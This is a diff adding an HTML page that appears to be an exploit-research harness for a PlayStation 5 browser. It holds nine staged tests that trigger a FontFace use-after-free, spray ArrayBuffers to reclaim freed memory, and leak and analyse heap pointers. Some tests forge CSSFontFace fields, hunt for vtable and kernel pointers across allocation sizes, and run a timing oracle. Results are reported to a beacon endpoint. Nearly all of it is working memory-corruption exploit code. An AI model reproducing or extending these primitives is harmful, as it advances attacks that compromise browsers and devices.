@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v12</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v12_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v12 BOOT test='+testNum);
+bn('P844v12-BOOT','test='+testNum);
+
+function scanABs(fabs){
+  for(var i=0;i<fabs.length;i++){
+    var bv=new BigUint64Array(fabs[i]);
+    for(var j=0;j<24;j++){
+      if(bv[j]!==0n){
+        var parts=[];
+        for(var k=0;k<24;k++){if(bv[k]!==0n)parts.push('q'+k+'=0x'+bv[k].toString(16));}
+        return {idx:i,bv:bv,desc:parts.join(';')};
+      }
+    }
+  }
+  return null;
+}
+
+var TESTS=[
+
+  // ============================================================
+  // T0: Deep _PS enumeration — find hidden methods/properties
+  // ============================================================
+  function T0(){
+    var results=[];
+    try{results.push('own:'+Object.getOwnPropertyNames(_PS).join(','));}catch(e){results.push('own:err');}
+    try{results.push('sym:'+Object.getOwnPropertySymbols(_PS).map(function(s){return s.toString();}).join(','));}catch(e){results.push('sym:err');}
+    try{results.push('keys:'+Reflect.ownKeys(_PS).map(function(k){return typeof k==='symbol'?k.toString():k;}).join(','));}catch(e){results.push('keys:err');}
+    try{results.push('proto:'+String(Object.getPrototypeOf(_PS)));}catch(e){results.push('proto:err');}
+    try{
+      var pp=Object.getPrototypeOf(_PS);
+      if(pp)results.push('proto_own:'+Object.getOwnPropertyNames(pp).join(','));
+    }catch(e){results.push('proto_own:err');}
+    try{
+      var desc=Object.getOwnPropertyDescriptor(_PS,'postMessage');
+      results.push('pm_desc:val='+typeof desc.value+',w='+desc.writable+',e='+desc.enumerable+',c='+desc.configurable);
+    }catch(e){results.push('pm_desc:err');}
+    // Check for event listener support
+    try{
+      results.push('addEL:'+(typeof _PS.addEventListener));
+      results.push('onmsg:'+(typeof _PS.onmessage));
+      results.push('dispEv:'+(typeof _PS.dispatchEvent));
+    }catch(e){results.push('events:err');}
+    // Check constructor
+    try{results.push('ctor:'+String(_PS.constructor));}catch(e){results.push('ctor:err');}
+    return results.join('|');
+  },
+
+  // ============================================================
+  // T1: window 'message' listener — does native respond via events?
+  // ============================================================
+  function T1(){
+    var received=[];
+    var handler=function(e){
+      received.push('src='+e.source+'|org='+e.origin+'|data='+String(e.data).substring(0,200));
+    };
+    window.addEventListener('message',handler);
+    // Send multiple messages and wait for potential responses
+    try{_PS.postMessage('{"cmd":"ping","id":1}');}catch(e){}
+    try{_PS.postMessage('{"type":"query","target":"system"}');}catch(e){}
+    try{_PS.postMessage('echo_test');}catch(e){}
+    try{_PS.postMessage('{"action":"getInfo"}');}catch(e){}
+    // Busy wait ~500ms for responses
+    var start=Date.now();
+    while(Date.now()-start<500){
+      try{document.body.offsetHeight;}catch(e){}
+    }
+    window.removeEventListener('message',handler);
+    return 'received='+received.length+(received.length>0?'|'+received.join('||'):'|none');
+  },
+
+  // ============================================================
+  // T2: FontFace UAF + keep style alive + canvas measureText
+  // Does the style system read from our reclaimed memory during measureText?
+  // ============================================================
+  function T2(){
+    var fabs=[];
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc2;src:local(Arial);unicode-range:U+0041-007A;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc2f',"local('Helvetica')",{unicodeRange:'U+0041-007A'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    var uafResult='';
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        // DO NOT remove style — keep @font-face reference alive
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc2f, sc2','AB');
+    // Wait for UAF completion
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit=scanABs(fabs);
+    if(!hit)return 'uaf=miss';
+    uafResult='hit:idx='+hit.idx;
+
+    // Create canvas and measure text using the UAF font
+    var c=document.createElement('canvas');
+    c.width=400;c.height=100;
+    var ctx=c.getContext('2d');
+
+    // Measure with default font first (baseline)
+    ctx.font='16px serif';
+    var baseW=ctx.measureText('ABCDEFGHIJ').width;
+    var baseMetrics=null;
+    try{
+      var m=ctx.measureText('ABCDEFGHIJ');
+      baseMetrics='w='+m.width;
+      if(m.actualBoundingBoxAscent!==undefined)baseMetrics+=',asc='+m.actualBoundingBoxAscent+',desc='+m.actualBoundingBoxDescent;
+    }catch(e){baseMetrics='err:'+e.message;}
+
+    // Now set font to our UAF font family
+    ctx.font='16px sc2';
+    var uafW=ctx.measureText('ABCDEFGHIJ').width;
+    var uafMetrics=null;
+    try{
+      var m=ctx.measureText('ABCDEFGHIJ');
+      uafMetrics='w='+m.width;
+      if(m.actualBoundingBoxAscent!==undefined)uafMetrics+=',asc='+m.actualBoundingBoxAscent+',desc='+m.actualBoundingBoxDescent;
+    }catch(e){uafMetrics='err:'+e.message;}
+
+    // Modify the reclaimed AB and measure again
+    var bv=hit.bv;
+    // Write a pattern that might look like valid font metrics
+    for(var j=0;j<24;j++)bv[j]=BigInt(0x4000000040000000); // mid-range values
+    document.body.offsetHeight;
+
+    ctx.font='16px sc2';
+    var modW=ctx.measureText('ABCDEFGHIJ').width;
+    var modMetrics=null;
+    try{
+      var m=ctx.measureText('ABCDEFGHIJ');
+      modMetrics='w='+m.width;
+      if(m.actualBoundingBoxAscent!==undefined)modMetrics+=',asc='+m.actualBoundingBoxAscent+',desc='+m.actualBoundingBoxDescent;
+    }catch(e){modMetrics='err:'+e.message;}
+
+    // Zero it and measure again
+    for(var j=0;j<24;j++)bv[j]=0n;
+    document.body.offsetHeight;
+    ctx.font='16px sc2';
+    var zeroW=ctx.measureText('ABCDEFGHIJ').width;
+
+    st.remove();
+    return uafResult+'|base='+baseMetrics+'|uaf='+uafMetrics+'|mod='+modMetrics+'|zero_w='+zeroW+'|changed='+(uafW!==modW||uafW!==zeroW);
+  },
+
+  // ============================================================
+  // T3: getComputedStyle + element metrics with UAF font
+  // Does element rendering read from our reclaimed memory?
+  // ============================================================
+  function T3(){
+    var fabs=[];
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc3;src:local(Arial);unicode-range:U+0041-007A;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc3f',"local('Helvetica')",{unicodeRange:'U+0041-007A'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc3f, sc3','AB');
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit=scanABs(fabs);
+    if(!hit)return 'uaf=miss';
+
+    // Create element that uses the UAF font
+    var el=document.createElement('span');
+    el.textContent='ABCDEFGHIJ';
+    el.style.fontFamily='sc3, serif';
+    el.style.fontSize='32px';
+    el.style.position='absolute';
+    el.style.visibility='hidden';
+    document.body.appendChild(el);
+    document.body.offsetHeight;
+
+    var w1=el.offsetWidth;
+    var h1=el.offsetHeight;
+    var rect1=el.getBoundingClientRect();
+    var cs=getComputedStyle(el);
+    var csFont=cs.fontFamily;
+
+    // Modify AB and remeasure
+    var bv=hit.bv;
+    for(var j=0;j<24;j++)bv[j]=BigInt(0x4141414141414141);
+    document.body.offsetHeight;
+    var w2=el.offsetWidth;
+    var h2=el.offsetHeight;
+
+    // Zero and remeasure
+    for(var j=0;j<24;j++)bv[j]=0n;
+    document.body.offsetHeight;
+    var w3=el.offsetWidth;
+    var h3=el.offsetHeight;
+
+    el.remove();st.remove();
+    return 'hit:'+hit.idx+'|w1='+w1+',h1='+h1+'|w2='+w2+',h2='+h2+'|w3='+w3+',h3='+h3+'|csFont='+csFont+'|changed='+(w1!==w2||h1!==h2||w1!==w3||h1!==h3);
+  },
+
+  // ============================================================
+  // T4: FontFace UAF + document.fonts.check() with varied AB data
+  // Re-examine check() with specific forged CSSFontFace fields
+  // ============================================================
+  function T4(){
+    var fabs=[];
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc4;src:local(Arial);unicode-range:U+0041-007A;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc4f',"local('Helvetica')",{unicodeRange:'U+0041-007A'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc4f, sc4','AB');
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit=scanABs(fabs);
+    if(!hit)return 'uaf=miss';
+
+    var results=[];
+
+    // Check with original UAF data
+    var c1,c2,c3;
+    try{c1=document.fonts.check('16px sc4');}catch(e){c1='err:'+e.message;}
+    results.push('orig='+c1);
+
+    // Forge status field to "loaded" (value 4 at different offsets)
+    var bv=hit.bv;
+    for(var j=0;j<24;j++)bv[j]=0n;
+    // CSSFontFace::Status::Loaded = 4
+    // Try setting status at multiple likely offsets
+    var dv=new DataView(hit.bv.buffer);
+    dv.setUint32(0,4,true); // offset 0
+    dv.setUint32(4,4,true); // offset 4
+    dv.setUint32(8,4,true); // offset 8
+    try{c2=document.fonts.check('16px sc4');}catch(e){c2='err:'+e.message;}
+    results.push('forged4='+c2);
+
+    // Set all fields to 0xFF
+    for(var j=0;j<24;j++)bv[j]=BigInt('0xFFFFFFFFFFFFFFFF');
+    try{c3=document.fonts.check('16px sc4');}catch(e){c3='err:'+e.message;}
+    results.push('allFF='+c3);
+
+    st.remove();
+    return 'hit:'+hit.idx+'|'+results.join('|');
+  },
+
+  // ============================================================
+  // T5: FontFace UAF q11/q13 pointer analysis
+  // Read the EXACT pointers, compute distances, check alignment
+  // ============================================================
+  function T5(){
+    var fabs=[];
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc5;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc5f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc5f, sc5','AB');
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit=scanABs(fabs);
+    if(!hit)return 'uaf=miss';
+
+    var bv=hit.bv;
+    var fullDump=[];
+    for(var j=0;j<24;j++){
+      if(bv[j]!==0n)fullDump.push('q'+j+'=0x'+bv[j].toString(16));
+    }
+
+    // Extract q11 and q13 specifically
+    var q11=bv[11];
+    var q13=bv[13];
+    var q0=bv[0];
+
+    // Compute self address: self = q11 - 0x58 (offset of q11 in the 192B struct)
+    var selfAddr=q11-BigInt(0x58);
+
+    // Distance from self to q13 target
+    var q13target=q13;
+    var dist13=q13target>selfAddr?(q13target-selfAddr):-(selfAddr-q13target);
+
+    // Check if q11 and q13 point AHEAD or BEHIND our AB
+    var q11off=q11>selfAddr?(q11-selfAddr):-(selfAddr-q11);
+    var q13off=q13>selfAddr?(q13-selfAddr):-(selfAddr-q13);
+
+    // Alignment check
+    var q11align=Number(q11 & 0xFn);
+    var q13align=Number(q13 & 0xFn);
+
+    return fullDump.join(';')+'|self=0x'+selfAddr.toString(16)+'|q11off='+q11off.toString()+'|q13off='+q13off.toString()+'|q11align='+q11align+'|q13align='+q13align;
+  },
+
+  // ============================================================
+  // T6: Second FontFace UAF — reclaim at DIFFERENT size
+  // If q11 points to a ~256B object, AB(256) might reclaim it!
+  // ============================================================
+  function T6(){
+    // First UAF: get the pointers from 192B reclaim
+    var fabs1=[];
+    var q11_addr=0n;
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc6a;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc6af',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        st.remove();st.textContent='';st=null;
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs1=[];for(var i=0;i<80;i++)fabs1.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc6af, sc6a','AB');
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit1=scanABs(fabs1);
+    if(!hit1)return 'uaf1=miss';
+    q11_addr=hit1.bv[11];
+    var q13_addr=hit1.bv[13];
+
+    // Now do a SECOND FontFace UAF with DIFFERENT AB sizes
+    // to try to reclaim the object that q11/q13 point to
+    var sizes=[64,96,128,160,192,224,256,320,384,448,512];
+    var results=['q11=0x'+q11_addr.toString(16),'q13=0x'+q13_addr.toString(16)];
+
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      var fabs2=[];
+      var st2=document.createElement('style');
+      st2.textContent="@font-face{font-family:sc6b"+si+";src:local(Arial);unicode-range:U+004"+(3+si).toString(16)+";}";
+      document.head.appendChild(st2);
+      var face2=new FontFace('sc6bf'+si,"local('Helvetica')",{unicodeRange:'U+004'+(2+si).toString(16)});
+      document.fonts.add(face2);void face2.loaded;
+      var ffired2=false;
+      (function(szz,sii,st2ref){
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+          get:function(){if(ffired2)return undefined;ffired2=true;
+            st2ref.remove();st2ref.textContent='';
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs2=[];for(var i=0;i<120;i++)fabs2.push(new ArrayBuffer(szz));
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}});
+      })(sz,si,st2);
+      document.fonts.load('1em sc6bf'+si+', sc6b'+si,'X');
+      for(var k=0;k<200000;k++)dummy+=k;
+      document.body.offsetHeight;
+
+      // Check if any AB has non-zero data (reclaimed something)
+      var found=false;
+      for(var i=0;i<fabs2.length;i++){
+        var bv=new BigUint64Array(fabs2[i]);
+        var nz=0;
+        for(var j=0;j<(sz/8);j++){if(bv[j]!==0n)nz++;}
+        if(nz>0){
+          // Check if any value looks like a vtable (code pointer)
+          var vtable=bv[0];
+          var hi=Number((vtable>>32n)&0xFFFFFFFFn);
+          found=true;
+          results.push(sz+'B:idx='+i+',nz='+nz+',q0=0x'+vtable.toString(16)+',kptr='+(hi>=0xFFFF8000?'YES':'no'));
+          break;
+        }
+      }
+      if(!found)results.push(sz+'B:empty');
+    }
+
+    return results.join('|');
+  },
+
+  // ============================================================
+  // T7: Triple UAF — try to reclaim objects from the SECOND UAF
+  // Chain: UAF1 → get ptrs → UAF2 → free more objects → spray to reclaim
+  // ============================================================
+  function T7(){
+    // Multi-size spray without UAF — just see what sizes get reclaimed
+    // Create and delete many FontFace objects, then spray various sizes
+    var results=[];
+
+    // Create 20 FontFace objects
+    var faces=[];
+    for(var i=0;i<20;i++){
+      var f=new FontFace('chain'+i,"local('Helvetica')",{unicodeRange:'U+'+(0x100+i).toString(16)});
+      document.fonts.add(f);
+      faces.push(f);
+    }
+    document.body.offsetHeight;
+
+    // Delete all of them to free 20 CSSFontFace objects
+    for(var i=0;i<faces.length;i++){
+      try{document.fonts.delete(faces[i]);}catch(e){}
+    }
+    faces=null;
+    document.body.offsetHeight;
+
+    // Spray AB(192) to try reclaiming them
+    var spray=[];
+    for(var i=0;i<200;i++)spray.push(new ArrayBuffer(192));
+
+    var reclaimed=0;
+    for(var i=0;i<spray.length;i++){
+      var bv=new BigUint64Array(spray[i]);
+      for(var j=0;j<24;j++){
+        if(bv[j]!==0n){
+          reclaimed++;
+          // Check first qword for vtable
+          var hi=Number((bv[0]>>32n)&0xFFFFFFFFn);
+          results.push('ab'+i+':q0=0x'+bv[0].toString(16)+(hi>=0xFFFF8000?'=KPTR':''));
+          break;
+        }
+      }
+    }
+
+    return 'deleted=20|spray=200|reclaimed='+reclaimed+(results.length>0?'|'+results.join(';'):'|none');
+  },
+
+  // ============================================================
+  // T8: Timing oracle — can we measure UAF pointer dereference?
+  // Write a forged pointer in q11/q13 slot, trigger font access
+  // ============================================================
+  function T8(){
+    var fabs=[];
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:sc8;src:local(Arial);unicode-range:U+0041-007A;}";
+    document.head.appendChild(st);
+    var face=new FontFace('sc8f',"local('Helvetica')",{unicodeRange:'U+0041-007A'});
+    document.fonts.add(face);void face.loaded;
+    var ffired=false;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){if(ffired)return undefined;ffired=true;
+        // Keep style alive for continued font access
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em sc8f, sc8','AB');
+    var dummy=0;for(var i=0;i<500000;i++)dummy+=i;
+    document.body.offsetHeight;
+
+    var hit=scanABs(fabs);
+    if(!hit)return 'uaf=miss';
+
+    var results=['hit:'+hit.idx];
+
+    // Measure baseline font access time
+    var el=document.createElement('span');
+    el.textContent='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    el.style.fontFamily='sc8, serif';
+    el.style.fontSize='32px';
+    el.style.position='absolute';
+    el.style.visibility='hidden';
+    document.body.appendChild(el);
+
+    var t0=performance.now();
+    for(var i=0;i<100;i++)document.body.offsetHeight;
+    var t1=performance.now();
+    results.push('base='+(t1-t0).toFixed(2)+'ms');
+
+    // Write zeros to AB (break font pointer chain)
+    var bv=hit.bv;
+    var saved=[];
+    for(var j=0;j<24;j++){saved.push(bv[j]);bv[j]=0n;}
+
+    var t2=performance.now();
+    for(var i=0;i<100;i++)document.body.offsetHeight;
+    var t3=performance.now();
+    results.push('zero='+(t3-t2).toFixed(2)+'ms');
+
+    // Restore original data
+    for(var j=0;j<24;j++)bv[j]=saved[j];
+
+    var t4=performance.now();
+    for(var i=0;i<100;i++)document.body.offsetHeight;
+    var t5=performance.now();
+    results.push('restored='+(t5-t4).toFixed(2)+'ms');
+
+    el.remove();st.remove();
+    return results.join('|');
+  }
+];
+
+var NAMES=[
+  'T0-psEnum','T1-winMessage','T2-measureText','T3-elemMetrics',
+  'T4-checkForge','T5-ptrAnalysis','T6-multiSize','T7-chainReclaim','T8-timingOracle'
+];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v12-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  setTest(testNum+1);
+  bn('P844v12-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v12-'+name+'-OK',String(result).substring(0,900));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v12-'+name+'-ERR',e.message);
+  }
+  setTimeout(function(){location.reload();},100);
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
